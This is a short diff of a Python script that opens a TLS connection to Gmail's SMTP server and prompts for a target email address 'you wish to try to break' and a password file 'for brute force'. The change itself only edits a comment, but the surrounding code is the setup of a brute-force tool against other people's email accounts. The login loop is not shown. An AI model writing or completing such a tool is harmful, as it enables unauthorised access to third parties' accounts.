@@ -9,7 +9,7 @@ def serve():
     global server
     server = smtplib.SMTP("smtp.gmail.com", 587) #connects to the SMTP server with the port
     server.ehlo()#lets the server know that you're there
-    server.starttls()#starts a connection with the server
+    server.starttls()#starts a secure connection with the server
 serve()
 emailUser = input("Enter an email address you wish to try to break: ")#username
 emailPass = input("Enter a text file for brute force: ")#passfile for brute force
